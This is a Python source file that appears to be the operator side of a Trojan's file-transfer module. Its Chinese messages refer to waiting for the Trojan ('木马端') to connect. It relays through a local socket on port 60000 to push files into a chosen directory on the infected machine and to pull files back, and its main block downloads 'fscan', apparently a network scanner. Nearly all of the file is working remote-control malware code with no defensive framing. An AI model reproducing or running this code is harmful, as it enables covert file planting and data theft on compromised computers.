from json import dumps,loads
from os.path import basename,getsize,exists
from base64 import b64decode,b64encode
from time import sleep
import socket

LOCAL_IP = "127.0.0.1"

def uploadfile(filepath:str,targetfilepath:str):
        if exists(filepath):
            pass
        else:
            print("文件不存在！")
            return ''
        if targetfilepath.strip()[-1] == "/":
            pass
        else:
            targetfilepath = targetfilepath+"/"
        print("发布任务！\n正在等待木马端连接...")
        s = socket.socket()
        s.connect((LOCAL_IP,60000))
        s.send("c".encode("utf-8"))
        switch = True
        filename = basename(filepath)
        filesize = getsize(filepath)
        while True:
            data = s.recv(1024)
            if data:
                isok = loads(data.decode("utf-8"))
                break
        if isinstance(isok,dict) and isok.get("info") == "yes":
            print("对接成功！正在上传文件...")
            while switch:
                filehead = {"filename":filename,"filesize":filesize,"filewritedir":targetfilepath}
                data = {"whoami":"c","data":str(b64encode(dumps(filehead).encode("utf-8")))}
                s.send(dumps(data).encode("utf-8"))
                sleep(1)
                data = {"whoami":"c","data":"senddata"}
                s.send(dumps(data).encode("utf-8"))
                sleep(1)
                with open(filepath,"rb") as fp:
                    while filesize >0:
                        content = fp.read(1024)
                        filesize -= len(content)
                        s.sendall(content)
                        if filesize == 0:
                            #sleep(1)
                            #s.sendall("exit".encode("utf-8")) #控制内层循环退出
                            switch = False
                            break
        print("发送完毕！")
        while True:
            data = s.recv(1024)
            if data:
                data = data.decode("utf-8")
                if data == "exit":
                    print("文件上传成功！")
                    break
        s.send(dumps({"whoami":"exit"}).encode("utf-8"))
        s.close()


def downfile(filepath):
    print("正在下载文件：{} ...".format(filepath))
    print("发布任务！\n正在等待木马端连接...")
    s = socket.socket()
    s.connect((LOCAL_IP,60000))
    s.send("t".encode("utf-8"))
    filename = ''
    filesize = ''
    filewritedir = ''
    data = s.recv(1024)
    if data:
        try:
            data = data.decode("utf-8")
        except:
            pass
        else:
            print("木马连接成功!!!")
            data = data.split("'")[1]
            data = loads(b64decode(data).decode("utf-8"))
            filename = data.get("filename")
            filesize = data.get("filesize")
            if filename == "nofile" and filesize == -1:
                s.send(dumps({"whoami":"exit"}).encode("utf-8"))
                s.close() 
                print('文件不存在！')
                return ''
            filewritedir = "../downfile/"#data.get("filewritedir")
            with open(filewritedir+filename,"wb") as fp:
                print("正在下载...")
                if isinstance(data,str):
                    data = data.encode("utf-8")
                    filesize -= len(data)
                    fp.write(data)
                while filesize >0:
                    data = s.recv(1024)
                    if data:
                        filesize -= len(data)
                        fp.write(data)
                        if filesize == 0:
                            fp.flush()
                            print("yes")
                            s.send(dumps({"whoami":"t","data":"exit"}).encode("utf-8"))
    sleep(1)
    s.send(dumps({"whoami":"exit"}).encode("utf-8"))
    print("下载完成！！！")
    s.close() 
if __name__ == "__main__":
    #print("上传文件测试")
    #uploadfile(input("源文件路径：").strip(),input("目标文件路径：").strip())
    downfile("fscan")